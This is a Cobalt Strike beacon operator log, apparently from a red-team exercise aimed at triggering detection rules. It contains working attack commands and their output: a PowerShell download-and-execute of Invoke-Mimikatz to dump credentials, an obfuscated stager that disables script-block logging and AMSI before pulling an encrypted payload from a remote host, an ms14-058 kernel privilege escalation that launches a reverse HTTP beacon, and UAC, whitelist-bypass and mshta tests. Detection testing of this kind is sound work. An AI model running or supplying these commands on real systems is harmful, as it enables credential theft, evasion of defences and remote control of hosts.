02/24 14:32:31 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 14:32:31 [task] Tasked beacon to run: Set-ExecutionPolicy Unrestricted 
02/24 14:33:17 [checkin] host called home, sent: 283 bytes
02/24 14:33:19 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  Unrestricted _x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>

02/24 14:33:19 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57/'); 
Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 87
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57/'); Invoke
-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 14:33:57 [input] <neo> powershell Get-ExecutionPolicy
02/24 14:33:57 [task] Tasked beacon to run: Get-ExecutionPolicy
02/24 14:34:19 [checkin] host called home, sent: 115 bytes
02/24 14:34:19 [output]
received output:
Bypass


02/24 14:34:22 [input] <neo> powershell Import-Module .\Invoke-Mimikatz.ps1
02/24 14:34:22 [task] Tasked beacon to run: Import-Module .\Invoke-Mimikatz.ps1
02/24 14:34:56 [input] <neo> powershell Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"'
02/24 14:34:56 [task] Tasked beacon to run: Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"'
02/24 14:35:19 [checkin] host called home, sent: 430 bytes
02/24 14:35:20 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Import-Module : 未能加载指定的模块“.\Invoke-Mimikatz.ps1”，因为在任何模块目录_x000D__x000A_</S><S S="Error">中都没有找到有效模块文件。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 14_x000D__x000A_</S><S S="Error">+ Import-Module &lt;&lt;&lt;&lt;  .\Invoke-Mimikatz.ps1_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ResourceUnavailable: (.\Invoke-Mimikatz.ps1:Stri _x000D__x000A_</S><S S="Error">   ng) [Import-Module], FileNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Comm _x000D__x000A_</S><S S="Error">   ands.ImportModuleCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/24 14:35:20 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请_x000D__x000A_</S><S S="Error">检查名称的拼写，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 16_x000D__x000A_</S><S S="Error">+ Invoke-Mimikatz &lt;&lt;&lt;&lt;  -Command '"privilege::debug" "sekurlsa::logonPasswords _x000D__x000A_</S><S S="Error">full"'_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com _x000D__x000A_</S><S S="Error">   mandNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/24 14:35:39 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 14:35:39 [task] Tasked beacon to run: Set-ExecutionPolicy Unrestricted 
02/24 14:36:20 [checkin] host called home, sent: 283 bytes
02/24 14:36:22 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  Unrestricted _x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>

02/24 14:36:22 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57/'); 
Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 87
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57/'); Invoke
-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 14:37:03 [input] <neo> powershell Set-ExecutionPolicy Unrestricted
02/24 14:37:03 [task] Tasked beacon to run: Set-ExecutionPolicy Unrestricted
02/24 14:37:22 [checkin] host called home, sent: 151 bytes
02/24 14:37:22 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  Unrestricted_x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>

02/24 14:38:23 [task] 通过Powershell下载执行ps脚本，触发 1086_002 & 1086_004 两条规则
02/24 14:38:23 [task] Tasked beacon to run: Set-ExecutionPolicy Unrestricted 
02/24 14:39:22 [checkin] host called home, sent: 283 bytes
02/24 14:39:24 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  Unrestricted _x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>

02/24 14:39:24 [output]
received output:
使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”
所在位置 行:1 字符: 46
+ IEX (New-Object Net.WebClient).DownloadString <<<< ('https://172.17.2.57/'); 
Invoke-Mimikatz -DumpCreds
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DotNetMethodException
 
无法将“Invoke-Mimikatz”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请
检查名称的拼写，如果包括路径，请确保路径正确，然后重试。
所在位置 行:1 字符: 87
+ IEX (New-Object Net.WebClient).DownloadString('https://172.17.2.57/'); Invoke
-Mimikatz <<<<  -DumpCreds
    + CategoryInfo          : ObjectNotFound: (Invoke-Mimikatz:String) [], Com 
   mandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 


02/24 14:47:38 [task] execute bypass UAC With Powershell add -Enc Command
02/24 14:48:24 [checkin] host called home, sent: 4033 bytes
02/24 14:49:34 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">使用“1”个参数调用“DownloadData”时发生异常:“无法连接到远程服务器”_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1401_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA &lt;&lt;&lt;&lt; ($SeR+$T);$iv=_x000D__x000A_</S><S S="Error">$dATA[0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : DotNetMethodException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1421_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error"> &lt;&lt;&lt;&lt; 0..3];$data=$dAta[4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法对空数组进行索引。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 1439_x000D__x000A_</S><S S="Error">+ IF($PSVERSIOnTable.PSVersIon.MAjor -GE 3){$GPS=[ref].AssEmBlY.GEtTYpE('System_x000D__x000A_</S><S S="Error">.Management.Automation.Utils')."GetFiE`Ld"('cachedGroupPolicySettings','N'+'onP_x000D__x000A_</S><S S="Error">ublic,Static').GEtVaLUE($nUll);If($GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'_x000D__x000A_</S><S S="Error">+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB'+'lockLogging'][_x000D__x000A_</S><S S="Error">'EnableScriptBlockInvocationLogging']=0}ELse{[ScrIPTBLoCk]."GetFIe`ld"('signatu_x000D__x000A_</S><S S="Error">res','N'+'onPublic,Static').SetVALue($nUlL,(New-OBJect CoLlECTiONs.GEnErIC.HAsH_x000D__x000A_</S><S S="Error">Set[STring]))}[ReF].ASseMbly.GETTYPe('System.Management.Automation.AmsiUtils')|_x000D__x000A_</S><S S="Error">?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SETVALUe($nULL,$trUE)}_x000D__x000A_</S><S S="Error">;};[SYSteM.NeT.SERvICEPoiNTManagEr]::ExPECT100ContInue=0;$wC=New-ObJecT SyStem._x000D__x000A_</S><S S="Error">NEt.WEbCLIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) lik_x000D__x000A_</S><S S="Error">e Gecko';$wc.HEadErS.ADd('User-Agent',$u);$WC.PROXy=[SystEm.NeT.WEbREqUEsT]::DE_x000D__x000A_</S><S S="Error">FaulTWEbProxY;$WC.PROXy.CREDeNTiALs = [SYstEm.NEt.CrEDENtiaLCachE]::DeFAUlTNEtw_x000D__x000A_</S><S S="Error">oRkCREDENTialS;$Script:Proxy = $wc.Proxy;$K=[SystEm.TeXT.EnCODing]::ASCII.GetBy_x000D__x000A_</S><S S="Error">TEs('[e6z2!pbTr75sE(3PHSyX^c{an&lt;F_h@+');$R={$D,$K=$ArGs;$S=0..255;0..255|%{$J=(_x000D__x000A_</S><S S="Error">$J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;_x000D__x000A_</S><S S="Error">$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}}_x000D__x000A_</S><S S="Error">;$ser='http://192.168.233.139:4444';$t='/news.php';$Wc.HEAdeRs.ADD("Cookie","se_x000D__x000A_</S><S S="Error">ssion=xfw+K3eCYz0EgUgNW18BFYPvbLQ=");$datA=$WC.DoWNlOADDATA($SeR+$T);$iv=$dATA[_x000D__x000A_</S><S S="Error">0..3];$data=$dAta[ &lt;&lt;&lt;&lt; 4..$daTa.lEngth];-jOIn[Char[]](&amp; $R $data ($IV+$K))|IEX_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (System.Object[]:Object[]) [], _x000D__x000A_</S><S S="Error">    RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : NullArray_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S><S S="Error">无法将“Q”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写_x000D__x000A_</S><S S="Error">，如果包括路径，请确保路径正确，然后重试。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 2_x000D__x000A_</S><S S="Error">+ Q &lt;&lt;&lt;&lt; _x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (Q:String) [], CommandNotFoundEx _x000D__x000A_</S><S S="Error">   ception_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : CommandNotFoundException_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/24 15:41:37 [task] 通过Powershell下载执行ps脚本，触发 1086_002
02/24 15:41:37 [task] Tasked beacon to run: Set-ExecutionPolicy Unrestricted 
02/24 15:42:36 [checkin] host called home, sent: 305 bytes
02/24 15:42:45 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Set-ExecutionPolicy : Windows PowerShell 已成功更新您的执行策略，但该设置已被在_x000D__x000A_</S><S S="Error">更具体的范围内定义的策略覆盖。由于此覆盖，您的 shell 将保留自己的“Bypass”当前_x000D__x000A_</S><S S="Error">有效执行策略。键入“Get-ExecutionPolicy -List”可查看您的执行策略设置。有关详细_x000D__x000A_</S><S S="Error">信息，请参阅“Get-Help Set-ExecutionPolicy”。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ Set-ExecutionPolicy &lt;&lt;&lt;&lt;  Unrestricted _x000D__x000A_</S><S S="Error">    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], Sec _x000D__x000A_</S><S S="Error">   urityException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Com _x000D__x000A_</S><S S="Error">   mands.SetExecutionPolicyCommand_x000D__x000A_</S></Objs>

02/24 15:42:45 [output]
received output:
Main : PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64b
it PS must be used on a 64bit OS.
所在位置 行:2695 字符: 6
+     Main <<<< 
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Main
 


02/24 15:58:41 [task] 4*************进行WMI启动**********
02/24 15:58:41 [task] 4*******请先提权*******
02/24 15:58:41 [task] 4********WMI正在启动,测试后需删除**********
02/24 15:59:58 [input] <neo> elevate ms14-058 test
02/24 15:59:59 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
02/24 16:00:47 [checkin] host called home, sent: 104503 bytes
02/24 16:00:48 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 44112
[*] Parsing SYSTEM_INFO...
[*] 149 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c14000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F671FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6A9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C2117370
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


02/24 16:52:43 [task] 4************白名单绕过*************
02/24 16:52:51 [checkin] host called home, sent: 80 bytes
02/24 16:54:39 [task] 4************白名单绕过*************
02/24 16:54:53 [checkin] host called home, sent: 80 bytes
02/24 17:10:40 [task] 4************mshta测试*************
02/24 17:10:40 [task] Tasked beacon to make directory c:\RedTeam\
02/24 17:10:40 [task] cd c:\RedTeam\
02/24 17:10:40 [task] cd c:\RedTeam\
02/24 17:10:40 [task] Tasked beacon to run: test.doc
02/24 17:10:55 [checkin] host called home, sent: 96 bytes
02/24 17:12:50 [task] 4************mshta测试*************
02/24 17:12:50 [task] Tasked beacon to make directory c:\RedTeam\
02/24 17:12:50 [task] cd c:\RedTeam\
02/24 17:12:50 [task] cd c:\RedTeam\
02/24 17:12:50 [task] Tasked beacon to run: test.doc
02/24 17:13:05 [checkin] host called home, sent: 96 bytes
02/24 17:13:06 [output]
received output:
另一个程序正在使用此文件，进程无法访问。


02/24 17:59:31 [task] 4************mshta测试*************
02/24 17:59:31 [task] Tasked beacon to make directory c:\RedTeam\
02/24 17:59:31 [task] cd c:\RedTeam\
02/24 17:59:31 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\test.doc as test.doc
02/24 17:59:31 [indicator] file: 1289db29cd5da56e26ffd8c45b1d2f38 8586 bytes test.doc
02/24 17:59:31 [task] cd c:\RedTeam\
02/24 17:59:31 [task] Tasked beacon to run: test.doc
02/24 18:00:09 [checkin] host called home, sent: 8702 bytes
